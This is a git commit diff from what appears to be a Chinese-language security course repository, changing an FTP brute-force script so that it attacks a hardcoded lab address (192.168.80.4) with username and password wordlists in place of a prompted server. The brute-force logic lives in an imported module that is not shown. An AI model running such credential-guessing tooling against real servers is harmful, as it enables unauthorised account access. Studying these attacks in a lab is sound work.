30db2e12ff105e059fbf9c1e3451c3e013f86ed4
JacksonJa <2937703346@qq.com>
2024-10-24 09:27:02 +0800

    By Jackson Ja

--- Python高级编程/第五章 身份认证攻击/ftp服务的登录和爆破/ftp爆破.py
+++ Python高级编程/第五章 身份认证攻击/ftp服务的登录和爆破/ftp爆破.py
@@ -1,9 +1,6 @@
 from ftp_brute_force import FtpBruteForce
 
 if __name__ == '__main__':
-    server_address = input("请输入服务器地址：")
-    user_dict = r"user.dic"
-    password_dict = r"password.dic"
-    fbf = FtpBruteForce(server_address, user_dict, password_dict)
+    fbf = FtpBruteForce("192.168.80.4", r"user.dic", r"password.dic")
     fbf.connection()
     fbf.brute()
